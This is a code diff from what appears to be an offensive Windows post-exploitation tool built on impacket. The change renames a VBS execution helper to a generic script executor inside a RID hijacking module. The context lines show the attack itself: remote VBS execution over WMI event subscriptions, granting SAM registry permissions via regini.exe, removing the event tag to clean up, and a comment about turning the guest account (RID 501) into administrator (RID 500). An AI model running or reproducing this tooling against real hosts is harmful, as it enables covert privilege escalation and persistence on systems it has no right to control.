@@ -8,7 +8,7 @@ import os
 import logging
 
 from lib.helpers import get_vbs
-from lib.methods.executeVBS import executeVBS_Toolkit
+from lib.methods.executeScript import executeScript_Toolkit
 from lib.modules.exec_command import EXEC_COMMAND
 from impacket.dcerpc.v5.dtypes import NULL
 
@@ -58,7 +58,7 @@ class RID_Hijack_Toolkit():
 
     def Permissions_Controller(self, action, user, currentUsers):
         exec_command = EXEC_COMMAND(self.iWbemLevel1Login, codec="gbk")
-        executer_vbs = executeVBS_Toolkit(self.iWbemLevel1Login)
+        executer_script = executeScript_Toolkit(self.iWbemLevel1Login)
 
         # For old system, if command too long with cause error in Win32_ScheduledJob create method
         # so we need to write batch file on target then execute it.
@@ -86,22 +86,22 @@ class RID_Hijack_Toolkit():
             vbs = get_vbs("Exec-Command-Silent-UnderNT6-II.vbs")
             vbs = vbs.replace("REPLACE_WITH_DEST", f"C:\\windows\\temp\\{ini_FileName}").replace("REPLACE_WITH_DATA", base64.b64encode(ini_Content.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_COMMAND", f"regini.exe C:\\windows\\temp\\{ini_FileName}")
 
-            tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
+            tag = executer_script.ExecuteScript(script_content=vbs, returnTag=True)
             exec_command.timer_For_UnderNT6()
-            executer_vbs.remove_Event(tag)
+            executer_script.remove_Event(tag)
             self.logger.log(100, "Granted / Restricted user permissions to registry key via regini.exe")
         else:
             self.logger.info("Granting / Restricting user permissions to registry key via regini.exe")
 
             vbs = get_vbs("GrantSamAccessPermission.vbs")
             vbs = vbs.replace("REPLACE_WITH_USER", currentUsers)
-            tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
+            tag = executer_script.ExecuteScript(script_content=vbs, returnTag=True)
 
             for i in range(self.timeout, 0,-1):
                 self.logger_countdown.info(f"Waiting {i}s for next step.\r")
                 time.sleep(1)
 
-            executer_vbs.remove_Event(tag)
+            executer_script.remove_Event(tag)
             self.logger.log(100, "Granted / Restricted user permissions to registry key via regini.exe")
 
     # Default is hijacking guest(RID=501) users to administrator(RID=500)
